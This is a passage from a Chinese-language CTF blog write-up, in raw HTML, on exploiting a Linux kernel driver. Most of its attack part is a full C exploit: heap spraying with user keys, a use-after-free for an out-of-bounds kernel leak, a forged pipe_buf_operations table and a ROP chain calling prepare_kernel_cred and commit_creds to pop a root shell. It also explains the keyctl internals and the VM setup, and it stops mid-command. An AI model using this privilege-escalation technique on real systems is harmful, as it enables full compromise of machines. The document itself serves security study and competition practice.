*/</span></span><br><span class="line"><span class="type">int</span> (*steal)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Get a reference to the pipe buffer.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">bool</span> (*get)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>那么这里我们可以利用 UAF 使得 <code>user_key_payload</code> 与 <code>pipe_inode_info</code> 占据同一个 object， <code>pipe_inode_info</code> 刚好会将 <code>user_key_payload-&gt;datalen</code> 改为 <code>0xFFFF</code> (这个字段应该是一个指针,至于为什么会是ffff不太清除使得我们能够继续读取数据,为了能够泄露数据肯定是个先用其uaf <code>user_key_payload</code>再uaf<code>pipe_inode_info</code>，从而读取 <code>pipe_inode_info</code> 以<u>泄露出 <code>pipe_buffer</code> 的地址。</u></p><p>而 <code>pipe_buffer</code> 是动态分配的，因此我们可以利用题目功能预先分配一个对象作为 <code>pipe_buffer</code> 并直接uaf在其上伪造函数表即可。</p><p>最终<strong>exp</strong>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernelpwn.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* kmalloc-192 has only 21 objects on a slub, we don&#x27;t need to spray to many */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_SPRAY_NUM 40</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_INODE_INFO_SZ 192</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_BUFFER_SZ 1024</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> USER_FREE_PAYLOAD_RCU 0xffffffff813d8210</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff81096110</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMIT_CREDS 0xffffffff81095c30</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81e00ed0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUSH_RSI_POP_RSP_POP_RBX_POP_RBP_POP_R12_RET 0xffffffff81250c9d</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RBX_POP_RBP_POP_R12_RET 0xffffffff81250ca4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDI_RET 0xffffffff8106ab4d</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> XCHG_RDI_RAX_DEC_STH_RET 0xffffffff81adfc70</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> dev_fd;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> &#123;</span></span><br><span class="line">    <span class="type">uint32_t</span> idx;</span><br><span class="line">    <span class="type">uint32_t</span> size;</span><br><span class="line">    <span class="type">void</span> *buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief allocate an object bby kmalloc(size, __GFP_ZERO | GFP_KERNEL )</span></span><br><span class="line"><span class="comment"> * __GFP_RECLAIM = __GFP_KSWAPD_RECLAIM | __GFP_DIRECT_RECLAIM </span></span><br><span class="line"><span class="comment"> * GFP_KERNEL = __GFP_RECLAIM | __GFP_IO | __GFP_FS</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param idx </span></span><br><span class="line"><span class="comment"> * @param size </span></span><br><span class="line"><span class="comment"> * @param buf </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">alloc</span><span class="params">(<span class="type">uint32_t</span> idx, <span class="type">uint32_t</span> size, <span class="type">void</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> <span class="title">n</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .size = size,</span><br><span class="line">        .buf = buf,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    ioctl(dev_fd, <span class="number">0xDEADBEEF</span>, &amp;n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">del</span><span class="params">(<span class="type">uint32_t</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> <span class="title">n</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    ioctl(dev_fd, <span class="number">0xC0DECAFE</span>, &amp;n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> *buf, pipe_buffer_addr;</span><br><span class="line">    <span class="type">int</span> key_id[KEY_SPRAY_NUM], victim_key_idx = <span class="number">-1</span>, pipe_key_id;</span><br><span class="line">    <span class="type">char</span> desciption[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> pipe_fd[<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span> retval;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* fundamental works */</span></span><br><span class="line">    bindCore(<span class="number">0</span>);</span><br><span class="line">    saveStatus();</span><br><span class="line"></span><br><span class="line">    buf = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">size_t</span>) * <span class="number">0x4000</span>);</span><br><span class="line"></span><br><span class="line">    dev_fd = open(<span class="string">&quot;/dev/rwctf&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (dev_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        errExit(<span class="string">&quot;FAILED to open the /dev/rwctf file!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* construct UAF on user_key_payload */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] construct UAF obj and spray keys...&quot;</span>);</span><br><span class="line">    alloc(<span class="number">0</span>, PIPE_INODE_INFO_SZ, buf);</span><br><span class="line">    del(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; KEY_SPRAY_NUM; i++) &#123;<span class="comment">//KEY_SPRAY_NUM不一定非得是40,只要能使得耗尽两个slab即可</span></span><br><span class="line">        <span class="built_in">snprintf</span>(desciption, <span class="number">0x100</span>, <span class="string">&quot;%s%d&quot;</span>, <span class="string">&quot;arttnba&quot;</span>, i);</span><br><span class="line">        key_id[i] = key_alloc(desciption, buf, PIPE_INODE_INFO_SZ - <span class="number">0x18</span>);</span><br><span class="line">        <span class="keyword">if</span> (key_id[i] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to alloc %d key!\n&quot;</span>, i);</span><br><span class="line">            errExit(<span class="string">&quot;FAILED to add_key()!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    del(<span class="number">0</span>);<span class="comment">//uaf</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* corrupt user_key_payload&#x27;s header */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] corrupting user_key_payload...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    buf[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    buf[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    buf[<span class="number">2</span>] = <span class="number">0x2000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; (KEY_SPRAY_NUM * <span class="number">2</span>); i++) &#123;</span><br><span class="line">        alloc(<span class="number">0</span>, PIPE_INODE_INFO_SZ, buf);<span class="comment">//不太清楚为什么要循环这么多次,按照道理LIFO,第一个就应该是刚才del的0啊</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* check for oob-read and leak kernel base */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] try to make an OOB-read...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; KEY_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key_read(key_id[i], buf, <span class="number">0x4000</span>) &gt; PIPE_INODE_INFO_SZ) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] found victim key at idx: %d\n&quot;</span>, i);</span><br><span class="line">            victim_key_idx = i;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            key_revoke(key_id[i]);</span><br><span class="line">        &#125;<span class="comment">//如果读了超过192个字符,那么就说明其是victim,否则的话将其销毁置函数指针</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (victim_key_idx == <span class="number">-1</span>) &#123;</span><br><span class="line">        errExit(<span class="string">&quot;FAILED at corrupt user_key_payload!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    kernel_offset = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x2000</span> / <span class="number">8</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (buf[i] &gt; kernel_base &amp;&amp; (buf[i] &amp; <span class="number">0xfff</span>) == <span class="number">0x210</span>) &#123;</span><br><span class="line">            kernel_offset = buf[i] - USER_FREE_PAYLOAD_RCU;</span><br><span class="line">            kernel_base += kernel_offset;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;<span class="comment">//在读出来的内容中,挨个判断是否大于kernel_base并且以0x210结尾,是的话就基本确定其是所要的函数指针了,又一个疑问,这里其实有一定概率读出来的内容中并不存在函数指针的,例如目标obj位于slab的最后位置,而且就算确定有,那也是先读再销毁产生函数指针,靠Random freelist???</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (kernel_offset == <span class="number">-1</span>) &#123;</span><br><span class="line">        errExit(<span class="string">&quot;FAILED to leak kernel addr!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Kernel offset: \033[0m0x%lx\n&quot;</span>, kernel_offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Kernel base: \033[0m0x%lx\n&quot;</span>, kernel_base);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* construct UAF on pipe_inode_buffer to leak pipe_buffer&#x27;s addr */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] construct UAF on pipe_inode_info...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 0-&gt;1-&gt;..., the 1 will be the payload object */</span></span><br><span class="line">    alloc(<span class="number">0</span>, PIPE_INODE_INFO_SZ, buf);</span><br><span class="line">    alloc(<span class="number">1</span>, PIPE_INODE_INFO_SZ, buf);</span><br><span class="line">    del(<span class="number">1</span>);</span><br><span class="line">    del(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    pipe_key_id = key_alloc(<span class="string">&quot;arttnba3pipe&quot;</span>, buf, PIPE_INODE_INFO_SZ - <span class="number">0x18</span>);</span><br><span class="line">    del(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* this object is for the pipe buffer */</span></span><br><span class="line">    alloc(<span class="number">0</span>, PIPE_BUFFER_SZ, buf);</span><br><span class="line">    del(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    pipe(pipe_fd);<span class="comment">//uaf PIPE_INODE_INFO and key_user_payload</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* note that the user_key_payload-&gt;datalen is 0xFFFF now */</span></span><br><span class="line">    retval = key_read(pipe_key_id, buf, <span class="number">0xffff</span>);</span><br><span class="line">    pipe_buffer_addr = buf[<span class="number">16</span>]; <span class="comment">/* pipe_inode_info-&gt;bufs得到pipe_buffer的地址 */</span>/</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got pipe_buffer: \033[0m0x%lx\n&quot;</span>, </span><br><span class="line">            pipe_buffer_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* construct fake pipe_buf_operations */</span></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;A&#x27;</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">    buf[<span class="number">0</span>] = *(<span class="type">size_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    buf[<span class="number">1</span>] = *(<span class="type">size_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    buf[<span class="number">2</span>] = pipe_buffer_addr + <span class="number">0x18</span>;  <span class="comment">/* pipe_buffer-&gt;ops,是函数指针表指向buffer内部 */</span></span><br><span class="line">    <span class="comment">/* after release(), we got back here */</span></span><br><span class="line">    buf[<span class="number">3</span>] = kernel_offset + POP_RBX_POP_RBP_POP_R12_RET;</span><br><span class="line">    <span class="comment">/* pipe_buf_operations-&gt;release */</span></span><br><span class="line">    buf[<span class="number">4</span>] = kernel_offset + PUSH_RSI_POP_RSP_POP_RBX_POP_RBP_POP_R12_RET;<span class="comment">//函数指针调用时第二个参数rsi就是buffer,所以之后才会又回到buf[3]</span></span><br><span class="line">    buf[<span class="number">5</span>] = *(<span class="type">size_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    buf[<span class="number">6</span>] = *(<span class="type">size_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    buf[<span class="number">7</span>] = kernel_offset + POP_RDI_RET;</span><br><span class="line">    buf[<span class="number">8</span>] = <span class="literal">NULL</span>;</span><br><span class="line">    buf[<span class="number">9</span>] = kernel_offset + PREPARE_KERNEL_CRED;</span><br><span class="line">    buf[<span class="number">10</span>] = kernel_offset + XCHG_RDI_RAX_DEC_STH_RET;</span><br><span class="line">    buf[<span class="number">11</span>] = kernel_offset + COMMIT_CREDS;</span><br><span class="line">    buf[<span class="number">12</span>] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="number">0x31</span>;</span><br><span class="line">    buf[<span class="number">13</span>] = *(<span class="type">size_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    buf[<span class="number">14</span>] = *(<span class="type">size_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    buf[<span class="number">15</span>] = getRootShell;</span><br><span class="line">    buf[<span class="number">16</span>] = user_cs;</span><br><span class="line">    buf[<span class="number">17</span>] = user_rflags;</span><br><span class="line">    buf[<span class="number">18</span>] = user_sp + <span class="number">8</span>; <span class="comment">/* system() wants it : ( */</span></span><br><span class="line">    buf[<span class="number">19</span>] = user_ss;</span><br><span class="line"></span><br><span class="line">    del(<span class="number">0</span>);</span><br><span class="line">    alloc(<span class="number">0</span>, PIPE_BUFFER_SZ, buf);<span class="comment">//uaf pipe_buffer</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* trigger pipe_buf_operations-&gt;release */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigerring pipe_buf_operations-&gt;release()...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    close(pipe_fd[<span class="number">1</span>]);</span><br><span class="line">    close(pipe_fd[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="kernel密钥管理接口"><a href="#kernel密钥管理接口" class="headerlink" title="kernel密钥管理接口"></a>kernel密钥管理接口</h3><p>在linux内核中有一套专门用于管理密钥的子系统,负责密钥的创建,读取,更新以及销毁等功能</p><p>内核提供了两个系统调用来负责这些操作</p><p><code>add_key()</code>和<code>keyctl()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">        <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line">        <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;keyutils.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">        <span class="type">key_serial_t</span> <span class="title function_">add_key</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *type, <span class="type">const</span> <span class="type">char</span> *description,</span></span><br><span class="line"><span class="params">                                    <span class="type">const</span> <span class="type">void</span> *payload, <span class="type">size_t</span> plen,</span></span><br><span class="line"><span class="params">                                    <span class="type">key_serial_t</span> keyring)</span>;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">       <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/unistd.h&gt;</span></span></span><br><span class="line">       <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line">       <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">       <span class="type">long</span> <span class="title function_">syscall</span><span class="params">(__NR_keyctl, <span class="type">int</span> operation, <span class="type">__kernel_ulong_t</span> arg2,</span></span><br><span class="line"><span class="params">                    <span class="type">__kernel_ulong_t</span> arg3, <span class="type">__kernel_ulong_t</span> arg4,</span></span><br><span class="line"><span class="params">                    <span class="type">__kernel_ulong_t</span> arg5)</span>;</span><br></pre></td></tr></table></figure><p>当调用<code>add_key()</code>创建带有 <code>description</code> 字符串的、类型为 <code>&quot;user&quot;</code> 的、长度为 <code>plen</code> 的内容为 <code>payload</code> 的密钥时</p><ul><li>首先会在内核空间中分配 obj 1 与 obj2，分配 flag 为 <code>GFP_KERNEL</code>，用以保存 <code>description</code> (字符串，最大大小为 4096)、<code>payload</code> (普通数据，大小无限制)</li><li>分配 obj3 保存 <code>description</code> ，分配 obj4 保存 <code>payload</code>，分配 flag 皆为 <code>GFP_KERNEL</code></li><li>释放 obj1 与 obj2，返回密钥 id</li></ul><p>其中 obj4 为一个 <code>user_key_payload</code> 结构体，定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_key_payload</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span>        <span class="comment">/* RCU destructor */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span>  datalen;    <span class="comment">/* length of this data */</span></span><br><span class="line">    <span class="type">char</span>        data[] __aligned(__alignof__(u64)); <span class="comment">/* actual data */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">void</span> (*func)(<span class="keyword">struct</span> callback_head *head);</span><br><span class="line">&#125; __attribute__((aligned(<span class="keyword">sizeof</span>(<span class="type">void</span> *))));</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rcu_head callback_head</span></span><br></pre></td></tr></table></figure><p>由于decription和payload的长度都是可控的,那么<code>obj1-4</code>的大小其实也是可控的</p><p>类似于 <code>msg_msg</code>，<code>user_key_payload</code> 结构体有着一个固定大小的头部，其余空间用来存储来自用户空间的数据（密钥内容）。</p><p><code>keyctl()</code> 系统调用为我们提供了读取、更新（分配新对象，释放旧对象）、销毁密钥（释放 payload）的功能，其中读取的最大长度由 <code>user_key_payload-&gt;datalen</code> 决定</p><p>读取 key 时的 len 应当<strong>不小于 user_key_payload-&gt;datalen，否则会读取失败</strong>,但是可以大于datalen。</p><p>当释放一个密钥时</p><p>内核中，对应的处理流程是<code>_x64_sys_keyctl() -&gt; keyctl_revoke_key() -&gt; key_revoke() -&gt; user_revoke() -&gt; call_rcu()</code>，在<code>call_rcu()</code>函数中将 <code>user_key_payload</code> 结构体的 <code>rcu.func</code> 设置成<code>user_free_payload_rcu()</code>函数的地址</p><h2 id="解法2"><a href="#解法2" class="headerlink" title="解法2"></a>解法2</h2><h2 id="解法3"><a href="#解法3" class="headerlink" title="解法3"></a>解法3</h2><h1 id="RWCTF2022-高校赛-Digging-into-kernel-1-amp-2"><a href="#RWCTF2022-高校赛-Digging-into-kernel-1-amp-2" class="headerlink" title="RWCTF2022 高校赛 - Digging into kernel 1 &amp; 2"></a>RWCTF2022 高校赛 - Digging into kernel 1 &amp; 2</h1><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>启动脚本</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -initrd rootfs.cpio \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 root=/dev/ram rdinit=/sbin/init quiet kalsr&quot;</span> \</span><br><span class="line">    -cpu kvm64,+smep,+smap \</span><br><span class="line">    -monitor null \</span><br><span class="line">    --nographic</span><br></pre></td></tr></table></figure><p>开启了smap,smep</p><p>又可以发现开启了kpti</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /sys/devices/system/cpu/vulnerabilities/*</span><br><span class="line">Processor vulnerable</span><br><span class="line">Mitigation: PTE Inversion</span><br><span class="line">Vulnerable: Clear CPU buffers attempted, no 